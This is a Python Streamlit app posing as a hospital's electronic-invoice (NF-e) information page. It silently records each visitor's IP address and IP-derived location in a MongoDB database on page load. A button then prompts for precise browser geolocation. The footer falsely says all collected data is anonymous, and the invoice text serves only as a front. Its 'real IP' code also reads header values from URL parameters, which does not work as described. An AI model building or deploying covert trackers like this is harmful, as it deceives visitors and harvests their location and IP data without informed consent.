import pandas as pd
import streamlit as st
import requests
from datetime import datetime
from streamlit_js_eval import streamlit_js_eval
from pymongo import MongoClient
from pymongo.errors import ConnectionFailure, OperationFailure
import streamlit.components.v1 as components

# Configuração inicial
st.set_page_config(
    page_title="Hospital Vaz Monteiro - Notas Fiscais Eletrônicas",
    initial_sidebar_state="expanded"
)

# Inicializa o MongoDB
def init_mongodb_prod():
    try:
        cluster_url = st.secrets["mongo"]["cluster_url"]
        db_name = st.secrets["mongo"]["db_name"]

        client = MongoClient(
            cluster_url,
            connectTimeoutMS=30000,
            socketTimeoutMS=None,
            tls=True,
            tlsAllowInvalidCertificates=False,
            retryWrites=True,
            w="majority"
        )

        client.admin.command('ping')
        db = client[db_name]

        if "locations" not in db.list_collection_names():
            db.create_collection("locations")

        return db["locations"]
        
    except OperationFailure as e:
        st.error(f"Falha na autenticação: {e}")
        return None
    except Exception as e:
        st.error(f"Erro de conexão: {e}")
        return None

def insert_location(collection, data):
    try:
        result = collection.insert_one(data)
        return result.inserted_id
    except Exception:
        return None

def get_real_client_ip():
    """Obtém o IP real do cliente a partir dos headers HTTP"""
    try:
        # Lista de headers que podem conter o IP real
        ip_headers = [
            'X-Forwarded-For',
            'X-Real-IP',
            'CF-Connecting-IP',  # Cloudflare
            'True-Client-IP',    # Akamai e Cloudflare
            'HTTP_CLIENT_IP',
            'HTTP_X_FORWARDED_FOR'
        ]
        
        # Verifica cada header possível
        for header in ip_headers:
            if header in st.session_state:
                ips = st.session_state[header]
                if ips:
                    # Pega o primeiro IP da lista (o mais externo)
                    return ips.split(',')[0].strip()
        
        # Fallback para o IP remoto se nenhum header especial existir
        return st.session_state.get('REMOTE_ADDR', None)
    except Exception:
        return None

def get_location_by_ip(ip=None):
    try:
        # Se nenhum IP for fornecido, tenta obter do cliente
        if ip is None:
            ip = get_real_client_ip()
            
            # Se ainda não tiver IP, usa serviço externo
            if ip is None:
                response = requests.get('https://api.ipify.org?format=json')
                if response.status_code == 200:
                    ip = response.json().get('ip')
        
        if ip:
            # Usa o IP para obter localização
            response = requests.get(f'https://ipapi.co/{ip}/json/')
            if response.status_code == 200:
                data = response.json()
                return {
                    'timestamp': datetime.now(),
                    'method': 'IP',
                    'latitude': float(data.get('latitude', 0)),
                    'longitude': float(data.get('longitude', 0)),
                    'city': data.get('city', 'Desconhecida'),
                    'region': data.get('region', 'Desconhecida'),
                    'country': data.get('country_name', 'Desconhecido'),
                    'ip_address': ip,
                    'source': 'ipapi.co'
                }
    except Exception:
        pass
    
    # Fallback para o método antigo se tudo falhar
    try:
        response = requests.get('https://ipinfo.io/json')
        if response.status_code == 200:
            data = response.json()
            loc = data.get('loc', '').split(',')
            if len(loc) == 2:
                return {
                    'timestamp': datetime.now(),
                    'method': 'IP',
                    'latitude': float(loc[0]),
                    'longitude': float(loc[1]),
                    'city': data.get('city', 'Desconhecida'),
                    'region': data.get('region', 'Desconhecida'),
                    'country': data.get('country', 'Desconhecido'),
                    'ip_address': data.get('ip', ''),
                    'source': 'ipinfo.io'
                }
    except Exception:
        return None

def get_browser_geolocation():
    try:
        result = streamlit_js_eval(js_expressions='''new Promise((resolve) => {
            navigator.geolocation.getCurrentPosition(
                position => resolve({
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                }),
                error => resolve({error: error.message})
            );
        })''', key='get_current_position')
        
        if result and 'error' not in result:
            return {
                'timestamp': datetime.now(),
                'method': 'Navegador',
                'latitude': result['latitude'],
                'longitude': result['longitude'],
                'accuracy': result['accuracy'],
                'source': 'navigator.geolocation'
            }
        return None
    except Exception:
        return None

# Inicializa a conexão com o MongoDB
collection = init_mongodb_prod()

# Interface principal
st.write("""
Emitir Nota Fiscal Eletrônica (NF-e) é um processo que envolve a geração de um arquivo XML com as informações da nota.
""")

# Capturar headers HTTP relevantes para obter IP real
if not hasattr(st.session_state, 'headers_captured'):
    st.session_state.headers_captured = True
    try:
        # Captura headers HTTP que podem conter o IP real
        headers = {
            'X-Forwarded-For': st.query_params.get('X-Forwarded-For', [''])[0],
            'X-Real-IP': st.query_params.get('X-Real-IP', [''])[0],
            'CF-Connecting-IP': st.query_params.get('CF-Connecting-IP', [''])[0],
            'True-Client-IP': st.query_params.get('True-Client-IP', [''])[0],
            'REMOTE_ADDR': st.query_params.get('REMOTE_ADDR', [''])[0]
        }
        st.session_state.update(headers)
    except Exception:
        pass

# Obter e armazenar localizações
ip_location = get_location_by_ip()
browser_location = None

if st.button("Compartilhar localização do navegador"):
    browser_location = get_browser_geolocation()
    if not browser_location:
        st.warning("""
        Habilite a opção de compartilhar localização no seu navegador.
        Como habilitar:
        1. Clique no ícone de cadeado ou "i" na barra de endereço
        2. Procure por "Permissões de localização"
        3. Altere para "Permitir"
        4. Atualize a página e tente novamente
        """)

# Armazenar no MongoDB
if collection is not None:
    if ip_location:
        insert_location(collection, ip_location)
    if browser_location:
        insert_location(collection, browser_location)

st.markdown("---")
st.caption("Todos os dados coletados são anônimos.")